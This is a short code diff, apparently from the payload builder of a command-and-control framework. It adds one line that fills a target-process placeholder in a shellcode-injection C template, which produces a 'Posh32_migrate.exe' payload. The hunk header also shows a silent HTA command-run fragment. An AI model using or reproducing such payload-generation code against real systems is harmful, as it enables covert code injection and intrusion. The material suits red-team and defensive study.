@@ -434,6 +434,7 @@ ao.run('%s', 0);window.close();
     with open("%sShellcode_Injector_Migrate.c" % FilesDirectory, 'rb') as f:
       content = f.read()
     ccode = content.replace("#REPLACEME#",sc32)
+    ccode = ccode.replace("#REPLACEMEPROCESS#", migrate_process)
     self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32_migrate.exe" % (self.BaseDirectory,name))
     filename = "%s%sPosh32_migrate.c" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
